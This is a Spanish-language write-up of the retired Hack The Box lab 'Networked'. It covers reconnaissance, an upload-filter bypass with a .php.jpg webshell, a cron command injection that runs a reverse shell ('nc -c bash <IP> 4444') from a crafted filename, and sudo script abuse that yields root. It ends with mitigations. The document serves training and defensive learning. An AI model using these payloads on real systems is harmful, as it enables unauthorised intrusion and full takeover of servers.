---
machine: Networked
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, centos, upload-bypass, cron, command-injection, sudo]
---

# Networked — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Un `/backup` con listado de directorio entrega el **código fuente** de la web, así que el reto pasa a ser de caja blanca: se ve cómo saltarse la lista blanca de subida con **doble extensión** (`.php.jpg`, que Apache ejecuta por un `AddHandler` mal anclado) → shell como `apache`. Luego, el **cron** de `guly` que «vigila» los ataques (`check_attack.php`) es inyectable con el nombre de un fichero → `guly`. El salto a root es un script con `sudo` que no entrecomilla una variable.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh  OpenSSH 7.4 (protocol 2.0)
80/tcp open  http Apache httpd 2.4.6 (CentOS) PHP/5.4.16
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

`/backup/` con `backup.tar` y `/uploads/`, `/photos.php`, `/upload.php`, `/lib.php`.

```bash
wget http://<IP>/backup/backup.tar && tar xf backup.tar && cat upload.php lib.php
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Bypass de subida**: `upload.php` comprueba extensión contra una lista blanca y el MIME con `finfo`. Un nombre `x.php.jpg` pasa ambas; el `AddHandler application/x-httpd-php .php` de Apache (sin `$`) ejecuta la parte `.php` intermedia.

```bash
cp shell.php shell.php.jpg
curl -F 'myFile=@shell.php.jpg' -F 'submit=Upload' http://<IP>/upload.php
curl http://<IP>/uploads/shell.php.jpg?cmd=id
```

2. **De `apache` a `guly`**: existe `crontab.guly` y `check_attack.php`, que cada pocos minutos recorre `/var/www/html/uploads` y borra lo que parece una IP, **interpolando el nombre del fichero en un comando**. Un nombre con `;` inyecta la reverse shell.

```bash
cd /var/www/html/uploads
touch '; nc -c bash <IP> 4444 ;'
```

```text
$ id
uid=48(apache) ...  →  guly
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
sudo -l
```

```text
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

El script (`#!/bin/bash -p`) escribe `/etc/sysconfig/network-scripts/ifcfg-guly` con los valores que tecleas y después ejecuta `/sbin/ifup guly0`. `ifup` hace `source` de ese fichero, así que un valor con espacio deja de ser una asignación y pasa a ser un **comando**. La validación por línea (`^[a-zA-Z0-9_ /-]+$`) permite el espacio: ahí está el fallo.

```text
sudo /usr/local/sbin/changename.sh
interface NAME:          eth0
interface PROXY_METHOD:  none
interface BROWSER_ONLY:  no
interface BOOTPROTO:     proto bash
```

```text
[root@networked network-scripts]#
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`AddHandler` con `.php.jpg`**: si el servidor sólo ejecuta la extensión final, hay que buscar otra combinación; aquí funciona la intermedia.
- **Cron cada 3 minutos**: la inyección no es inmediata; hay que esperar la siguiente ejecución.
- **Comillas en el nombre**: el nombre del fichero debe ser válido; usar `touch` con comillas simples.

- Un backup del código convierte la enumeración en lectura de la lógica de validación.
- Comprobar extensión y MIME no basta si el servidor ejecuta extensiones intermedias.
- Un cron que concatena nombres de fichero en un `exec` es una puerta de entrada.
- Mitigación: `AddHandler` anclado (`$`), validación por contenido y nombres saneados, y scripts `sudo` con comillas.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
